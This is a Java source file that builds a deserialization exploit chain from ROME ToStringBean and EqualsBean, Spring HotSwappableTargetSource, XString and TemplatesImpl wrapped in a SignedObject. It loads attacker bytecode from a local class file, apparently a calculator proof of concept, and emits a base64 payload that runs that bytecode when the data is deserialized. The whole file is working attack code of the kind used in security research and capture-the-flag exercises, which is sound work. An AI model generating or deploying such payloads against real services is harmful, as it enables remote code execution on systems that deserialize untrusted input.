package SignedObject;

import Utils.ReflectUtils;
import Utils.SerialUtils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.xml.transform.Templates;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.HashMap;

public class ROMEHotSwappableTargetSource {
    public static void main(String[] args) throws Exception {

        HashMap<Object,Object> evilObject = (HashMap<Object, Object>) getEvilObject();

        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject(evilObject, kp.getPrivate(), Signature.getInstance("DSA"));

        ToStringBean toStringBean = new ToStringBean(SignedObject.class,signedObject);

        org.springframework.aop.target.HotSwappableTargetSource h1 = new org.springframework.aop.target.HotSwappableTargetSource(toStringBean);
        org.springframework.aop.target.HotSwappableTargetSource h2 = new org.springframework.aop.target.HotSwappableTargetSource(new XString("jasper"));

        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put(h1,h1);
        hashMap.put(h2,h2);

        SerialUtils.serialize(hashMap);
        SerialUtils.unserialize();
        SerialUtils.serializeB64(hashMap);
    }
    // here can be CC object or others need to deserialize.
    public static Object getEvilObject()throws Exception {
        TemplatesImpl templatesimpl = new TemplatesImpl();
        byte[] bytecodes = Files.readAllBytes(Paths.get("D:\\Calc.class"));
        ReflectUtils.setFieldValue(templatesimpl,"_name","Jasper");
        ReflectUtils.setFieldValue(templatesimpl,"_bytecodes",new byte[][] {bytecodes});

        ToStringBean toStringBean = new ToStringBean(Templates.class,templatesimpl);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);

        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put(equalsBean, "123");
        return hashMap;
    }

}